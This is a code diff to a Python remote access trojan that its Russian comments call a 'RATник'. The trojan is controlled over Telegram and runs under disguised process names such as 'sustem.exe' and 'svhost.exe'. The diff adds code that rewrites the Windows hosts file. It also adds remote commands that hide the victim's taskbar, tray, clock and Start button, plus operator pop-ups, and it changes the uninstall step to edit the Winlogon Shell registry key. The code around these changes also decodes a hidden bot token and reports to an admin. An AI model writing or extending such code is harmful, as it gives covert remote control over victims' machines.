@@ -11,7 +11,6 @@ import mss
 import keyboard as kb
 from PIL import Image, ImageDraw
 from urllib.request import urlopen
-import logging
 import getpass
 import win32gui
 from datetime import datetime
@@ -61,8 +60,6 @@ bot_token_bytes = base64.b64decode(decoded_data)
 bot_token = bot_token_bytes.decode('utf-8')
 bot = telebot.TeleBot(bot_token)
 
-
-
 pyautogui.FAILSAFE = False
 #bot.remove_webhook()
 GDI_EFFECT_RUNNING = False
@@ -79,8 +76,6 @@ global message
 pyautogui.FAILSAFE = False
 
 from urllib.request import urlopen
-import ssl
-
 def check_internet_connection():
     """Проверяет наличие интернет-соединения"""
     try:
@@ -91,7 +86,7 @@ def check_internet_connection():
         # context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         # context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
 
-        resp = urlopen('https://www.yandex.ru', timeout=2, context=context)
+        resp = urlopen('https://www.google.com', timeout=2, context=context)
         # Опционально можно проверить код ответа
         return getattr(resp, 'status', 200) == 200
     except ssl.SSLError as e:
@@ -101,7 +96,16 @@ def check_internet_connection():
         print("Other error:", e)
         return False
 
+content = None
+with open("C:\\Windows\\System32\\drivers\\etc\\hosts", "r")as f:
+    content = f.read()
 
+print(content)
+if "api.telegram.org" in content:
+    print("прокси уже есть в файле hosts!")
+else:
+    with open("C:\\Windows\\System32\\drivers\\etc\\hosts", "w")as f:
+        f.write(f"{content}\n 149.154.167.220 api.telegram.org")
 print(check_internet_connection())
 #print(check_internet_connection())
 global admin_id, hostname, user, admin, internet
@@ -229,6 +233,12 @@ def cleanup_lock():
 
 cleanup_lock()
 
+def get_process_name_by_pid(pid):
+    try:
+        process = psutil.Process(pid)
+        return process.name()
+    except psutil.NoSuchProcess:
+        return None
 
 def check_lock():
     """Проверка наличия запущенного экземпляра бота"""
@@ -242,12 +252,7 @@ def check_lock():
         if LOCK_FILE.exists():
             with open(LOCK_FILE, 'r') as f:
                 pid = int(f.read().strip())
-                """def get_process_name_by_pid(pid):
-                    try:
-                        process = psutil.Process(pid)
-                        return process.name()
-                    except psutil.NoSuchProcess:
-                        return None
+                """
 
                 # Пример использования:
                 process_name = get_process_name_by_pid(pid)
@@ -256,11 +261,12 @@ def check_lock():
                     sys.exit(1)"""""
 
             if psutil.pid_exists(pid):
-                bot.send_message(admin_id, f"Бот уже запущен с PID {pid}. Новая сессия будет закрыта.")
-                LOCK_FILE.unlink()
-                print('обнаружен 2 запуск!')
-                time.sleep(5)
-                sys.exit(1)
+                if get_process_name_by_pid(pid) == "sustem.exe":
+                    bot.send_message(admin_id, f"Бот уже запущен с PID {pid}. Новая сессия будет закрыта.")
+                    LOCK_FILE.unlink()
+                    print('обнаружен 2 запуск!')
+                    time.sleep(5)
+                    sys.exit(1)
             else:
                 # Старый процесс завершился некорректно, очищаем файл блокировки
                 LOCK_FILE.unlink()
@@ -347,6 +353,86 @@ def run_restarter():
         bot.send_message(admin_id, f'svhost.exe(Перезапускатель RATника) не запущен! Ошибка:{str(e)}')
         pass
 run_restarter()
+
+@bot.message_handler(commands=['item'])
+def item(message):
+    # Загрузка user32.dll
+    user32 = ctypes.WinDLL('user32', use_last_error=True)
+
+    # Объявление функций
+    FindWindow = user32.FindWindowW
+    FindWindowEx = user32.FindWindowExW
+    ShowWindow = user32.ShowWindow
+
+    # Константы
+    SW_HIDE = 0
+    SW_SHOW = 5
+    # Получение окна панели задач
+    taskbar_hwnd = FindWindow("Shell_TrayWnd", None)
+    if not taskbar_hwnd:
+        print("Не удалось найти окно 'Shell_TrayWnd'.")
+        return
+
+    # Получение окна области уведомлений (TrayNotifyWnd)
+    tray_notify_hwnd = FindWindowEx(taskbar_hwnd, None, "TrayNotifyWnd", None)
+    if not tray_notify_hwnd:
+        print("Не удалось найти окно 'TrayNotifyWnd'.")
+
+    # Получение окна системных часов
+    clock_hwnd = FindWindowEx(tray_notify_hwnd, None, "TrayClockWClass", None)
+    if not clock_hwnd:
+        print("Не удалось найти окно 'TrayClockWClass'.")
+    command_text = message.text.replace('/item', '').strip()
+    # Если команда и параметры пусты
+    if not command_text:
+        help_text = (
+            "Доступные команды:\n"
+            "/item hide tray — скрыть трей\n"
+            "/item show tray — показать трей\n"
+            "/item hide clock — скрыть часы\n"
+            "/item show clock — показать часы\n"
+            "/item hide start_button — скрыть кнопку Пуск\n"
+            "/item show start_button — показать кнопку Пуск\n"
+            "/item hide taskbar — скрыть панель задач\n"
+            "/item show taskbar — показать панель задач"
+        )
+        bot.send_message(message.chat.id, help_text)
+        return
+    command, *params = command_text.split(maxsplit=1)
+    params = params[0] if params else ''
+    print(command)
+    print(params)
+    print(command_text)
+    if command == "hide".lower():
+        if params == "tray":
+            ShowWindow(tray_notify_hwnd, SW_HIDE if command == "hide" else SW_SHOW)
+            bot.send_message(admin_id, "Трей скрыт")
+        elif params == "clock":
+            ShowWindow(clock_hwnd, SW_HIDE if command == "hide" else SW_SHOW)
+            bot.send_message(admin_id, "Часы скрыты")
+        elif params == "start_button":
+            h = ctypes.windll.user32.FindWindowA(b'Button', None)
+            bot.send_message(admin_id, "Кнопка Пуск скрыта")
+        elif params == "taskbar":
+            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
+            bot.send_message(admin_id, "Панель задач скрыта")
+        ctypes.windll.user32.ShowWindow(h, 0)
+
+    if command == "show".lower():
+        if params == "tray":
+            ShowWindow(tray_notify_hwnd, SW_HIDE if command == "hide" else SW_SHOW)
+            bot.send_message(admin_id, "Трей показан")
+        elif params == "clock":
+            ShowWindow(clock_hwnd, SW_HIDE if command == "hide" else SW_SHOW)
+            bot.send_message(admin_id, "Часы показаны")
+        elif params == "start_button":
+            h = ctypes.windll.user32.FindWindowA(b'Button', None)
+            bot.send_message(admin_id, "Кнопка Пуск показана")
+        elif params == "taskbar":
+            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
+            bot.send_message(admin_id, "Панель задач показана")
+        ctypes.windll.user32.ShowWindow(h, 9)
+
 
 @bot.message_handler(commands=['antiviruses'])
 def antiviruses(message):
@@ -440,29 +526,12 @@ def sound(message):
             bot.send_message(admin_id, f'Ошибка при проигрывании звука:{str(e)}')
 
 
-@bot.message_handler(commands=['showtaskbar'])
-def showtaskbar(message): 
-    if message.chat.id == admin_id:
-        bot.reply_to(message, f" Панель задач показана!")
-        h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
-        # снова показываем панель задач
-        ctypes.windll.user32.ShowWindow(h, 9)
-
-
-@bot.message_handler(commands=['hidetaskbar'])
-def hidetaskbar(message):
-    if message.chat.id == admin_id:
-        bot.reply_to(message, f" Панель задач скрыта!")
-        h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
-        # скрываем панель задач
-        ctypes.windll.user32.ShowWindow(h, 0)
-
 @bot.message_handler(commands=['uninstall'])
 def unistall(message):
     if message.chat.id == admin_id:
         bot.reply_to(message, f" Удаляю RATник...")
         # Удаляем задачу из планировщика
-        command = f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c schtasks /Delete /TN svhost /F\'"'
+        command = f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f'
             
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
                                         universal_newlines=True, encoding='cp866')
@@ -1253,6 +1322,13 @@ def afk():
 
 is_afk = threading.Thread(target=afk)
 is_afk.start()
+
+@bot.message_handler(commands=['plyer_msgbox'])
+def plyer_msgbox(message):
+    msg = message.text.replace('/plyer_msgbox', '').strip().lower()
+    if not msg:
+        bot.reply_to(message, "Пожалуйста, отправьте текст после команды!")
+    plyer.notification.notify(msg)
 
 @bot.message_handler(commands=['cd'])
 def cd_drive(message):
